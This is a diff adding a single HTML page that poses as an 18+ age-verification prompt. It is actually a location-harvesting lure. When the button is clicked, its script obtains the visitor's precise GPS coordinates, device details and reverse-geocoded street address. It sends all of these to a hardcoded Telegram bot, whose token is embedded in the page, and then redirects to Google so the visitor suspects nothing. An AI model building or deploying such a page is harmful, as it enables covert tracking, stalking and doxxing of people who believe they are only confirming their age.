@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #ccc;
+            margin-bottom: 30px;
+        }
+        button {
+            background: #00adb5;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .status {
+            margin-top: 20px;
+            color: #fff;
+            font-size: 14px;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🔐 Age Verification</h1>
+        <p>You must be 18+ to continue</p>
+        <button onclick="verify()">I am 18+</button>
+        <div class="status" id="status"></div>
+        <div class="loading" id="loading">⏳ Processing...</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
+        const CHAT_ID = '1471307057';
+        
+        function sendToTelegram(data) {
+            let message = '';
+            
+            if (data.lat) {
+                message = `📍 <b>NEW LOCATION!</b>\n\n` +
+                         `🌍 Latitude: ${data.lat}\n` +
+                         `🗺️ Longitude: ${data.lng}\n` +
+                         `📏 Accuracy: ${data.accuracy} meters\n` +
+                         `🕐 Time: ${new Date().toLocaleString()}\n\n` +
+                         `📱 Device: ${data.ua.substring(0, 100)}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        latitude: data.lat,
+                        longitude: data.lng
+                    })
+                });
+            } else {
+                message = `❌ <b>ERROR</b>\n\n` +
+                         `Error: ${data.error}\n` +
+                         `📱 Device: ${data.ua.substring(0, 100)}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            }
+        }
+        
+        async function getAddress(lat, lng) {
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
+                const data = await res.json();
+                
+                const message = `🏠 <b>ADDRESS</b>\n\n${data.display_name || 'Address not found'}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message.substring(0, 4096),
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {}
+        }
+        
+        function verify() {
+            const btn = event.target;
+            const status = document.getElementById('status');
+            const loading = document.getElementById('loading');
+            
+            btn.disabled = true;
+            btn.style.opacity = '0.5';
+            loading.style.display = 'block';
+            status.innerHTML = '';
+            
+            if (!navigator.geolocation) {
+                status.innerHTML = '❌ Geolocation not supported';
+                status.style.color = '#ff6b6b';
+                sendToTelegram({
+                    error: 'Geolocation not supported',
+                    ua: navigator.userAgent
+                });
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                loading.style.display = 'none';
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const data = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: Math.round(position.coords.accuracy),
+                        ua: navigator.userAgent
+                    };
+                    
+                    sendToTelegram(data);
+                    getAddress(data.lat, data.lng);
+                    
+                    status.innerHTML = '✅ Access granted! Redirecting...';
+                    status.style.color = '#4caf50';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 2000);
+                },
+                (error) => {
+                    let errorMsg = '';
+                    switch(error.code) {
+                        case 1: errorMsg = 'User denied geolocation'; break;
+                        case 2: errorMsg = 'Location unavailable'; break;
+                        case 3: errorMsg = 'Timeout'; break;
+                        default: errorMsg = error.message;
+                    }
+                    
+                    status.innerHTML = `❌ ${errorMsg}`;
+                    status.style.color = '#ff6b6b';
+                    
+                    sendToTelegram({
+                        error: errorMsg,
+                        ua: navigator.userAgent
+                    });
+                    
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    loading.style.display = 'none';
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+    </script>
+</body>
+</html>
